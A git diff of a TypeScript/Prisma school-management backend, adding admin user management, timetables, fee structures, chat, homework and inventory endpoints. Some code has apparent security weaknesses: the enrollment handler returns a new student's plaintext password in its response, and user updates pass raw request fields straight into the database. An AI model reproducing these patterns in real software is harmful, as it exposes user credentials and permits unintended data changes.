+    const ft = await tuitionFeeType(u.schoolId);
+    await prisma.feeCollection.create({ data: { studentId: student.id, feeTypeId: ft.id, academicYearId: await activeYearId(u.schoolId), amountDue: Number(adm.feeStructure.amount), dueDate: new Date(), status: "PENDING", remarks: adm.feeStructure.name } });
+  }
+
   await prisma.admission.update({ where: { id }, data: { status: "ENROLLED" } });
   await prisma.auditLog.create({ data: { school: { connect: { id: u.schoolId } }, action: "admission.enrolled", entityType: "Student", entityId: student.id, metadata: { applicationNo: adm.applicationNo } } });
-  return json({ id: student.id, admissionNo: student.admissionNo }, 201, h);
+  const enrollSchool = await prisma.school.findUnique({ where: { id: u.schoolId }, select: { slug: true } });
+  return json({
+    id: student.id,
+    admissionNo: student.admissionNo,
+    credentials: { email, password: plainPassword, schoolSlug: enrollSchool?.slug ?? "", role: "student" },
+  }, 201, h);
 }
 
 // ─── Enhanced Grade/Section ────────────────────────────────────────────────────
 
 async function updateGrade(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const grade = await prisma.grade.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!grade) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -3072,7 +3210,7 @@ async function updateGrade(req: Request, h: Headers, id: string): Promise<Respon
 
 async function updateSection(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const sec = await prisma.section.findFirst({ where: { id, grade: { schoolId: u.schoolId } } });
   if (!sec) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -3082,7 +3220,7 @@ async function updateSection(req: Request, h: Headers, id: string): Promise<Resp
 
 async function updateSection(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const sec = await prisma.section.findFirst({ where: { id, grade: { schoolId: u.schoolId } } });
   if (!sec) return err("Not found", 404, h);
   const body = await req.json().catch(() => null);
@@ -3098,7 +3236,7 @@ async function updateSection(req: Request, h: Headers, id: string): Promise<Resp
 
 async function deleteSection(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const sec = await prisma.section.findFirst({ where: { id, grade: { schoolId: u.schoolId } } });
   if (!sec) return err("Not found", 404, h);
   await prisma.section.delete({ where: { id } });
@@ -3107,7 +3245,7 @@ async function deleteSection(req: Request, h: Headers, id: string): Promise<Resp
 
 async function deleteGrade(req: Request, h: Headers, id: string): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const grade = await prisma.grade.findFirst({ where: { id, schoolId: u.schoolId } });
   if (!grade) return err("Not found", 404, h);
   await prisma.grade.delete({ where: { id } });
@@ -3142,7 +3280,7 @@ async function getFeeTypes(req: Request, h: Headers): Promise<Response> {
 
 async function createFeeType(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.name) return err("name required", 400, h);
   const ft = await prisma.feeType.create({ data: { schoolId: u.schoolId, name: body.name, description: body.description ?? null, isRecurring: body.isRecurring ?? true } });
@@ -3151,13 +3289,1025 @@ async function createFeeType(req: Request, h: Headers): Promise<Response> {
 
 async function createFeeCollection(req: Request, h: Headers): Promise<Response> {
   const u = await authSchool(req);
-  if (!u || u.role !== "ADMIN") return err("Unauthorized", 401, h);
+  if (!u || u.role !== "admin") return err("Unauthorized", 401, h);
   const body = await req.json().catch(() => null);
   if (!body?.studentId || !body?.feeTypeId || !body?.amountDue || !body?.dueDate) return err("studentId, feeTypeId, amountDue, dueDate required", 400, h);
   const count = await prisma.feeCollection.count({ where: { student: { schoolId: u.schoolId } } });
   const receiptNo = `RCP-${new Date().getFullYear()}-${String(count + 1).padStart(5, "0")}`;
   const fc = await prisma.feeCollection.create({ data: { studentId: body.studentId, feeTypeId: body.feeTypeId, amountDue: body.amountDue, amountPaid: body.amountPaid ?? 0, dueDate: new Date(body.dueDate), status: body.status ?? "PENDING", remarks: body.remarks ?? null, receiptNo, academicYearId: body.academicYearId ?? null } });
   return json(fc, 201, h);
+}
+
+// ─── Public school directory (no auth) ──────────────────────────────────────────
+// Used by the "Find your school" page and branded school login. Returns ONLY
+// non-sensitive, public-facing fields, and only for live (active/trial) schools.
+
+const PUBLIC_SCHOOL_SELECT = {
+  id: true, name: true, slug: true, logo: true,
+  address: true, city: true, district: true, province: true,
+  schoolType: true, establishedYear: true,
+} as const;
+
+const PUBLIC_SCHOOL_STATUSES = ["ACTIVE", "TRIAL"] as any[];
+
+async function getPublicSchools(req: Request, h: Headers, url: URL): Promise<Response> {
+  const search = (url.searchParams.get("search") ?? "").trim();
+  const where: any = { status: { in: PUBLIC_SCHOOL_STATUSES } };
+  if (search) {
+    where.OR = [
+      { name: { contains: search, mode: "insensitive" } },
+      { city: { contains: search, mode: "insensitive" } },
+      { district: { contains: search, mode: "insensitive" } },
+    ];
+  }
+  const schools = await prisma.school.findMany({
+    where,
+    select: PUBLIC_SCHOOL_SELECT,
+    orderBy: { name: "asc" },
+    take: 60,
+  });
+  return json({ schools }, 200, h);
+}
+
+async function getPublicSchool(req: Request, h: Headers, slug: string): Promise<Response> {
+  const school = await prisma.school.findFirst({
+    where: { slug, status: { in: PUBLIC_SCHOOL_STATUSES } },
+    select: PUBLIC_SCHOOL_SELECT,
+  });
+  if (!school) return err("School not found", 404, h);
+  return json({ school }, 200, h);
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// ─── ENTERPRISE FEATURE MODULES ─────────────────────────────────────────────────
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async function adminOnly(req: Request): Promise<{ id: string; schoolId: string; role: string; email: string } | null> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return null;
+  return u;
+}
+
+// ─── User Management (admin: list + set password) ────────────────────────────
+async function listSchoolUsers(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const url = new URL(req.url);
+  const role = url.searchParams.get("role") ?? "";
+  const search = url.searchParams.get("search") ?? "";
+  const users = await prisma.user.findMany({
+    where: {
+      schoolId: u.schoolId,
+      role: role ? { equals: role.toUpperCase() as any } : { not: "ADMIN" as any },
+      ...(search ? { OR: [
+        { email: { contains: search, mode: "insensitive" } },
+        { profile: { OR: [
+          { firstName: { contains: search, mode: "insensitive" } },
+          { lastName: { contains: search, mode: "insensitive" } },
+        ] } },
+      ] } : {}),
+    },
+    include: { profile: true },
+    orderBy: [{ role: "asc" }, { email: "asc" }],
+  });
+  return json(users.map((u) => ({
+    id: u.id, email: u.email, role: u.role, status: u.status,
+    name: u.profile ? `${u.profile.firstName} ${u.profile.lastName}`.trim() : null,
+    createdAt: u.createdAt, lastLoginAt: u.lastLoginAt,
+  })), 200, h);
+}
+
+async function getSchoolUser(req: Request, h: Headers, userId: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const user = await prisma.user.findUnique({
+    where: { id: userId },
+    include: {
+      profile: true,
+      teacher: true,
+      staff: { include: { department: true } },
+      student: {
+        include: {
+          enrollments: { include: { section: { include: { grade: true } }, academicYear: true }, orderBy: { enrolledAt: "desc" }, take: 1 },
+        },
+      },
+      parent: { include: { children: { include: { student: { include: { user: { include: { profile: true } } } } } } } },
+    },
+  });
+  if (!user || user.schoolId !== u.schoolId) return err("User not found", 404, h);
+  return json({
+    id: user.id, email: user.email, role: user.role, status: user.status,
+    createdAt: user.createdAt, lastLoginAt: user.lastLoginAt,
+    profile: user.profile ? {
+      firstName: user.profile.firstName, lastName: user.profile.lastName,
+      phone: user.profile.phone, gender: user.profile.gender,
+      dateOfBirth: user.profile.dateOfBirth, address: user.profile.address,
+    } : null,
+    teacher: user.teacher ? {
+      employeeId: user.teacher.employeeId, qualification: user.teacher.qualification,
+      experience: user.teacher.experience, specialization: user.teacher.specialization,
+      joinDate: user.teacher.joinDate,
+    } : null,
+    staff: user.staff ? {
+      employeeId: user.staff.employeeId, designation: user.staff.designation,
+      departmentId: user.staff.departmentId, departmentName: user.staff.department?.name ?? null,
+      joinDate: user.staff.joinDate, salary: user.staff.salary,
+    } : null,
+    student: user.student ? {
+      admissionNo: user.student.admissionNo, rollNumber: user.student.rollNumber,
+      stream: user.student.stream, transportMode: user.student.transportMode,
+      currentSection: user.student.enrollments[0]
+        ? { sectionId: user.student.enrollments[0].sectionId, sectionName: `${user.student.enrollments[0].section.grade.name} ${user.student.enrollments[0].section.name}` }
+        : null,
+    } : null,
+    parent: user.parent ? {
+      occupation: user.parent.occupation,
+      children: user.parent.children.map((c) => ({
+        studentId: c.studentId, relationship: c.relationship,
+        name: c.student.user.profile ? `${c.student.user.profile.firstName} ${c.student.user.profile.lastName}`.trim() : c.student.user.email,
+      })),
+    } : null,
+  }, 200, h);
+}
+
+async function updateSchoolUser(req: Request, h: Headers, userId: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const user = await prisma.user.findUnique({ where: { id: userId }, select: { schoolId: true, role: true } });
+  if (!user || user.schoolId !== u.schoolId) return err("User not found", 404, h);
+  const body = await req.json().catch(() => null);
+  if (!body) return err("Invalid body", 400, h);
+
+  await prisma.$transaction(async (tx) => {
+    if (body.email) await tx.user.update({ where: { id: userId }, data: { email: body.email } });
+    if (body.status) await tx.user.update({ where: { id: userId }, data: { status: body.status } });
+    if (body.profile) {
+      const existing = await tx.userProfile.findUnique({ where: { userId } });
+      if (existing) {
+        await tx.userProfile.update({ where: { userId }, data: body.profile });
+      } else {
+        await tx.userProfile.create({ data: { userId, firstName: "", lastName: "", ...body.profile } });
+      }
+    }
+    if (body.teacher && user.role === "TEACHER") {
+      await tx.teacher.update({ where: { userId }, data: {
+        qualification: body.teacher.qualification ?? undefined,
+        experience: body.teacher.experience !== undefined ? Number(body.teacher.experience) : undefined,
+        specialization: body.teacher.specialization ?? undefined,
+        employeeId: body.teacher.employeeId ?? undefined,
+        joinDate: body.teacher.joinDate ? new Date(body.teacher.joinDate) : undefined,
+      }});
+    }
+    if (body.staff && user.role === "STAFF") {
+      await tx.staff.update({ where: { userId }, data: {
+        designation: body.staff.designation ?? undefined,
+        employeeId: body.staff.employeeId ?? undefined,
+        departmentId: body.staff.departmentId || null,
+        joinDate: body.staff.joinDate ? new Date(body.staff.joinDate) : undefined,
+        salary: body.staff.salary !== undefined ? (body.staff.salary === "" || body.staff.salary === null ? null : Number(body.staff.salary)) : undefined,
+      }});
+    }
+    if (body.student && user.role === "STUDENT") {
+      await tx.student.update({ where: { userId }, data: {
+        rollNumber: body.student.rollNumber ?? undefined,
+        stream: body.student.stream ?? undefined,
+        transportMode: body.student.transportMode ?? undefined,
+      }});
+    }
+    if (body.parent && user.role === "PARENT") {
+      await tx.parent.update({ where: { userId }, data: { occupation: body.parent.occupation ?? undefined } });
+    }
+  });
+  return json({ ok: true }, 200, h);
+}
+
+async function setUserPassword(req: Request, h: Headers, userId: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.password || typeof body.password !== "string" || body.password.length < 6)
+    return err("Password must be at least 6 characters", 400, h);
+  const target = await prisma.user.findUnique({ where: { id: userId }, select: { schoolId: true, role: true } });
+  if (!target || target.schoolId !== u.schoolId) return err("User not found", 404, h);
+  const hashed = await Bun.password.hash(body.password);
+  await prisma.user.update({ where: { id: userId }, data: { password: hashed } });
+  await prisma.auditLog.create({ data: {
+    school: { connect: { id: u.schoolId } },
+    action: "auth.password_set_by_admin",
+    entityType: "User", entityId: userId,
+    metadata: { setBy: u.id },
+  } });
+  return json({ ok: true, message: "Password updated successfully" }, 200, h);
+}
+
+// ─── Notifications ──────────────────────────────────────────────────────────────
+async function getNotifications(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.notification.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" }, take: 100 });
+  return json(list, 200, h);
+}
+async function createNotification(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.title || !body?.body) return err("title and body required", 400, h);
+  const n = await prisma.notification.create({ data: { schoolId: u.schoolId, title: body.title, body: body.body, type: body.type ?? "info", targetRole: body.targetRole ?? null } });
+  return json(n, 201, h);
+}
+async function deleteNotification(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  await prisma.notification.deleteMany({ where: { id, schoolId: u.schoolId } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Routine (Timetable) ──────────────────────────────────────────────────────
+async function ensureActiveTimetable(schoolId: string): Promise<string | null> {
+  const ay = await prisma.academicYear.findFirst({ where: { schoolId, isActive: true } });
+  if (!ay) return null;
+  let tt = await prisma.timetable.findFirst({ where: { academicYearId: ay.id, isActive: true } });
+  if (!tt) tt = await prisma.timetable.create({ data: { academicYearId: ay.id, name: "Default", isActive: true } });
+  return tt.id;
+}
+async function getRoutine(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const slots = await prisma.timetableSlot.findMany({
+    where: { section: { grade: { schoolId: u.schoolId } } },
+    include: { section: { include: { grade: true } }, subject: true, teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ dayOfWeek: "asc" }, { periodNumber: "asc" }],
+  });
+  return json(slots.map((s) => ({
+    id: s.id, sectionId: s.sectionId, subjectId: s.subjectId, teacherId: s.teacherId,
+    sectionName: `${s.section.grade.name} ${s.section.name}`,
+    subjectName: s.subject.name,
+    teacherName: s.teacher?.user.profile ? `${s.teacher.user.profile.firstName} ${s.teacher.user.profile.lastName}`.trim() : (s.teacher ? s.teacher.user.email : null),
+    dayOfWeek: s.dayOfWeek, periodNumber: s.periodNumber, startTime: s.startTime, endTime: s.endTime, roomNo: s.roomNo,
+    shift: s.shift, materials: s.materials,
+  })), 200, h);
+}
+async function createRoutineSlot(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || (u.role !== "admin" && u.role !== "teacher")) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.sectionId || !body?.subjectId || body?.dayOfWeek === undefined || body?.periodNumber === undefined || !body?.startTime || !body?.endTime)
+    return err("sectionId, subjectId, dayOfWeek, periodNumber, startTime, endTime required", 400, h);
+  const timetableId = await ensureActiveTimetable(u.schoolId);
+  if (!timetableId) return err("No active academic year. Create one first.", 400, h);
+  try {
+    const slot = await prisma.timetableSlot.create({ data: {
+      timetableId, sectionId: body.sectionId, subjectId: body.subjectId, teacherId: body.teacherId || null,
+      dayOfWeek: Number(body.dayOfWeek), periodNumber: Number(body.periodNumber), startTime: body.startTime, endTime: body.endTime, roomNo: body.roomNo || null,
+      shift: body.shift === "MORNING" ? "MORNING" : "DAY", materials: body.materials?.trim() || null,
+    } });
+    return json(slot, 201, h);
+  } catch (e: any) {
+    if (e?.code === "P2002") return err("A period already exists for this section/day/period.", 400, h);
+    return err("Failed to create slot", 400, h);
+  }
+}
+async function deleteRoutineSlot(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || (u.role !== "admin" && u.role !== "teacher")) return err("Unauthorized", 401, h);
+  const slot = await prisma.timetableSlot.findFirst({ where: { id, section: { grade: { schoolId: u.schoolId } } } });
+  if (!slot) return err("Not found", 404, h);
+  await prisma.timetableSlot.delete({ where: { id } });
+  return json({ ok: true }, 200, h);
+}
+
+// Shared slot → JSON shape for the portal routine endpoints (includes section name).
+function routineSlotJson(s: any) {
+  return {
+    id: s.id, sectionId: s.sectionId, subjectId: s.subjectId, teacherId: s.teacherId,
+    sectionName: s.section ? `${s.section.grade.name} ${s.section.name}` : null,
+    subjectName: s.subject?.name ?? null,
+    teacherName: s.teacher?.user?.profile ? `${s.teacher.user.profile.firstName} ${s.teacher.user.profile.lastName}`.trim() : (s.teacher ? s.teacher.user.email : null),
+    dayOfWeek: s.dayOfWeek, periodNumber: s.periodNumber, startTime: s.startTime, endTime: s.endTime,
+    roomNo: s.roomNo, shift: s.shift, materials: s.materials,
+  };
+}
+
+// Student sees their own section's routine.
+async function studentRoutine(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "student") return err("Unauthorized", 401, h);
+  const student = await prisma.student.findFirst({ where: { userId: u.id } });
+  if (!student) return err("Student profile not found", 404, h);
+  const enrollment = await prisma.studentEnrollment.findFirst({ where: { studentId: student.id, status: "ACTIVE" }, orderBy: { enrolledAt: "desc" } });
+  if (!enrollment) return json([], 200, h);
+  const slots = await prisma.timetableSlot.findMany({
+    where: { sectionId: enrollment.sectionId },
+    include: { section: { include: { grade: true } }, subject: true, teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ dayOfWeek: "asc" }, { periodNumber: "asc" }],
+  });
+  return json(slots.map(routineSlotJson), 200, h);
+}
+
+// Parent sees a chosen child's section routine (validates the child belongs to this parent).
+async function parentRoutine(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "parent") return err("Unauthorized", 401, h);
+  const parent = await prisma.parent.findFirst({ where: { userId: u.id }, include: { children: true } });
+  if (!parent) return err("Parent profile not found", 404, h);
+  const childId = url.searchParams.get("childId");
+  const link = childId ? parent.children.find((c) => c.studentId === childId) : parent.children[0];
+  if (!link) return json([], 200, h);
+  const enrollment = await prisma.studentEnrollment.findFirst({ where: { studentId: link.studentId, status: "ACTIVE" }, orderBy: { enrolledAt: "desc" } });
+  if (!enrollment) return json([], 200, h);
+  const slots = await prisma.timetableSlot.findMany({
+    where: { sectionId: enrollment.sectionId },
+    include: { section: { include: { grade: true } }, subject: true, teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ dayOfWeek: "asc" }, { periodNumber: "asc" }],
+  });
+  return json(slots.map(routineSlotJson), 200, h);
+}
+
+// Teacher sees their own periods across all sections.
+async function teacherRoutine(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "teacher") return err("Unauthorized", 401, h);
+  const teacher = await prisma.teacher.findFirst({ where: { userId: u.id } });
+  if (!teacher) return err("Teacher profile not found", 404, h);
+  const slots = await prisma.timetableSlot.findMany({
+    where: { teacherId: teacher.id },
+    include: { section: { include: { grade: true } }, subject: true, teacher: { include: { user: { include: { profile: true } } } } },
+    orderBy: [{ dayOfWeek: "asc" }, { periodNumber: "asc" }],
+  });
+  return json(slots.map(routineSlotJson), 200, h);
+}
+
+// ─── Fee Structures / Installment plans ─────────────────────────────────────────
+async function getFeeStructures(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const level = url.searchParams.get("level");
+  const stream = url.searchParams.get("stream");
+  const category = url.searchParams.get("category");
+  const list = await prisma.feeStructure.findMany({
+    where: {
+      schoolId: u.schoolId,
+      ...(level !== null && level !== "" ? { level: Number(level) } : {}),
+      ...(stream ? { stream } : {}),
+      ...(category ? { category: category as any } : {}),
+    },
+    include: { feeType: true, grade: true, installments: { orderBy: { installmentNo: "asc" } } },
+    orderBy: [{ level: "asc" }, { category: "asc" }],
+  });
+  return json(list, 200, h);
+}
+async function createFeeStructure(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return err("Only admin can create fee structures", 403, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.name || !body?.category || body?.amount === undefined || body?.amount === null)
+    return err("name, category and amount are required", 400, h);
+  if (Number.isNaN(Number(body.amount)) || Number(body.amount) < 0) return err("amount must be a positive number", 400, h);
+  const installments = Array.isArray(body.installments) ? body.installments.filter((i: any) => i && i.amount !== undefined) : [];
+  const structure = await prisma.feeStructure.create({
+    data: {
+      schoolId: u.schoolId,
+      name: body.name,
+      category: body.category,
+      level: body.level !== undefined && body.level !== null && body.level !== "" ? Number(body.level) : null,
+      stream: body.stream?.trim() || null,
+      gradeId: body.gradeId || null,
+      academicYearId: body.academicYearId || (await activeYearId(u.schoolId)),
+      amount: Number(body.amount),
+      dueDay: body.dueDay !== undefined && body.dueDay !== null && body.dueDay !== "" ? Number(body.dueDay) : null,
+      isRecurring: !!body.isRecurring,
+      installments: installments.length ? { create: installments.map((i: any, idx: number) => ({
+        installmentNo: i.installmentNo ?? idx + 1,
+        label: i.label?.trim() || null,
+        dueStage: i.dueStage?.trim() || null,
+        amount: Number(i.amount),
+        dueDay: i.dueDay !== undefined && i.dueDay !== null && i.dueDay !== "" ? Number(i.dueDay) : null,
+      })) } : undefined,
+    },
+    include: { installments: { orderBy: { installmentNo: "asc" } } },
+  });
+  return json(structure, 201, h);
+}
+async function updateFeeStructure(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return err("Only admin can edit fee structures", 403, h);
+  const existing = await prisma.feeStructure.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Fee structure not found", 404, h);
+  const body = await req.json().catch(() => null);
+  if (!body) return err("No data", 400, h);
+  // Replace installments wholesale when provided.
+  if (Array.isArray(body.installments)) {
+    await prisma.feeInstallment.deleteMany({ where: { feeStructureId: id } });
+  }
+  const updated = await prisma.feeStructure.update({
+    where: { id },
+    data: {
+      name: body.name ?? existing.name,
+      category: body.category ?? existing.category,
+      level: body.level !== undefined ? (body.level === null || body.level === "" ? null : Number(body.level)) : existing.level,
+      stream: body.stream !== undefined ? (body.stream?.trim() || null) : existing.stream,
+      gradeId: body.gradeId !== undefined ? (body.gradeId || null) : existing.gradeId,
+      amount: body.amount !== undefined ? Number(body.amount) : existing.amount,
+      dueDay: body.dueDay !== undefined ? (body.dueDay === null || body.dueDay === "" ? null : Number(body.dueDay)) : existing.dueDay,
+      isRecurring: body.isRecurring !== undefined ? !!body.isRecurring : existing.isRecurring,
+      ...(Array.isArray(body.installments) ? { installments: { create: body.installments.filter((i: any) => i && i.amount !== undefined).map((i: any, idx: number) => ({
+        installmentNo: i.installmentNo ?? idx + 1,
+        label: i.label?.trim() || null,
+        dueStage: i.dueStage?.trim() || null,
+        amount: Number(i.amount),
+        dueDay: i.dueDay !== undefined && i.dueDay !== null && i.dueDay !== "" ? Number(i.dueDay) : null,
+      })) } } : {}),
+    },
+    include: { installments: { orderBy: { installmentNo: "asc" } } },
+  });
+  return json(updated, 200, h);
+}
+async function deleteFeeStructure(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u || u.role !== "admin") return err("Only admin can delete fee structures", 403, h);
+  const existing = await prisma.feeStructure.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Fee structure not found", 404, h);
+  await prisma.feeStructure.delete({ where: { id } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Homework (Assignments oversight) ───────────────────────────────────────────
+async function getHomework(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const list = await prisma.assignment.findMany({
+    where: { teacher: { user: { schoolId: u.schoolId } } },
+    include: { teacher: { include: { user: { include: { profile: true } } } }, _count: { select: { submissions: true } } },
+    orderBy: { dueDate: "desc" },
+  });
+  return json(list.map((a) => ({
+    id: a.id, title: a.title, description: a.description, dueDate: a.dueDate, maxMarks: a.maxMarks,
+    teacherId: a.teacherId,
+    teacherName: a.teacher.user.profile ? `${a.teacher.user.profile.firstName} ${a.teacher.user.profile.lastName}`.trim() : a.teacher.user.email,
+    submissionCount: a._count.submissions, createdAt: a.createdAt,
+  })), 200, h);
+}
+async function createHomework(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.title || !body?.dueDate || !body?.teacherId) return err("title, dueDate, teacherId required", 400, h);
+  const teacher = await prisma.teacher.findFirst({ where: { id: body.teacherId, user: { schoolId: u.schoolId } } });
+  if (!teacher) return err("Teacher not found", 404, h);
+  const a = await prisma.assignment.create({ data: {
+    teacherId: body.teacherId, sectionId: body.sectionId || null, subjectId: body.subjectId || null,
+    title: body.title, description: body.description || null, dueDate: new Date(body.dueDate), maxMarks: body.maxMarks ? Number(body.maxMarks) : null,
+  } });
+  return json(a, 201, h);
+}
+async function deleteHomework(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const a = await prisma.assignment.findFirst({ where: { id, teacher: { user: { schoolId: u.schoolId } } } });
+  if (!a) return err("Not found", 404, h);
+  await prisma.assignment.delete({ where: { id } });
+  return json({ ok: true }, 200, h);
+}
+
+// ─── Chat (Messages) ────────────────────────────────────────────────────────────
+async function getSchoolUsers(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const users = await prisma.user.findMany({ where: { schoolId: u.schoolId, id: { not: u.id } }, include: { profile: true }, orderBy: { createdAt: "desc" } });
+  return json(users.map((x) => ({
+    id: x.id, email: x.email, role: x.role.toLowerCase(),
+    name: x.profile ? `${x.profile.firstName} ${x.profile.lastName}`.trim() : x.email.split("@")[0],
+  })), 200, h);
+}
+async function getMessages(req: Request, h: Headers, url: URL): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const withUser = url.searchParams.get("with");
+  if (withUser) {
+    const msgs = await prisma.message.findMany({
+      where: { OR: [{ senderId: u.id, recipientId: withUser }, { senderId: withUser, recipientId: u.id }] },
+      orderBy: { createdAt: "asc" }, take: 200,
+    });
+    await prisma.message.updateMany({ where: { senderId: withUser, recipientId: u.id, readAt: null }, data: { readAt: new Date() } });
+    return json(msgs.map((m) => ({ id: m.id, content: m.content, senderId: m.senderId, recipientId: m.recipientId, mine: m.senderId === u.id, createdAt: m.createdAt })), 200, h);
+  }
+  // conversation list: latest message per counterpart
+  const all = await prisma.message.findMany({
+    where: { OR: [{ senderId: u.id }, { recipientId: u.id }] },
+    include: { sender: { include: { profile: true } }, recipient: { include: { profile: true } } },
+    orderBy: { createdAt: "desc" },
+  });
+  const seen = new Set<string>();
+  const convos: any[] = [];
+  for (const m of all) {
+    const other = m.senderId === u.id ? m.recipient : m.sender;
+    if (seen.has(other.id)) continue;
+    seen.add(other.id);
+    const unread = await prisma.message.count({ where: { senderId: other.id, recipientId: u.id, readAt: null } });
+    convos.push({
+      userId: other.id,
+      name: other.profile ? `${other.profile.firstName} ${other.profile.lastName}`.trim() : other.email.split("@")[0],
+      role: other.role.toLowerCase(), lastMessage: m.content, lastAt: m.createdAt, unread,
+    });
+  }
+  return json(convos, 200, h);
+}
+async function sendMessage(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.recipientId || !body?.content?.trim()) return err("recipientId and content required", 400, h);
+  const recipient = await prisma.user.findFirst({ where: { id: body.recipientId, schoolId: u.schoolId } });
+  if (!recipient) return err("Recipient not found", 404, h);
+  const m = await prisma.message.create({ data: { senderId: u.id, recipientId: body.recipientId, content: body.content.trim(), subject: body.subject || null } });
+  return json(m, 201, h);
+}
+
+// ─── Inventory ──────────────────────────────────────────────────────────────────
+async function getInventory(req: Request, h: Headers): Promise<Response> {
+  const u = await authSchool(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const items = await prisma.inventory.findMany({ where: { schoolId: u.schoolId }, orderBy: { createdAt: "desc" } });
+  return json(items, 200, h);
+}
+async function createInventory(req: Request, h: Headers): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const body = await req.json().catch(() => null);
+  if (!body?.name) return err("name required", 400, h);
+  const item = await prisma.inventory.create({ data: {
+    schoolId: u.schoolId, name: body.name, category: body.category ?? "STATIONERY", quantity: Number(body.quantity ?? 0),
+    unit: body.unit ?? "pcs", condition: body.condition ?? "GOOD", location: body.location || null,
+    unitPrice: body.unitPrice != null && body.unitPrice !== "" ? Number(body.unitPrice) : null,
+    purchaseDate: body.purchaseDate ? new Date(body.purchaseDate) : null,
+  } });
+  return json(item, 201, h);
+}
+async function updateInventory(req: Request, h: Headers, id: string): Promise<Response> {
+  const u = await adminOnly(req);
+  if (!u) return err("Unauthorized", 401, h);
+  const existing = await prisma.inventory.findFirst({ where: { id, schoolId: u.schoolId } });
+  if (!existing) return err("Not found", 404, h);
+  const body = await req.json().catch(() => null);
+  const item = await prisma.inventory.update({ where: { id }, data: {
+    name: body.name, category: body.category, quantity: body.quantity != null ? Number(body.quantity) : undefined,
+    unit: body.unit, condition: body.condition, location: body.location,
+    unitPrice: body.unitPrice != null && body.unitPrice !== "" ? Number(body.unitPrice) : undefined,
+  } });
+  return json(item, 200, h);
+}
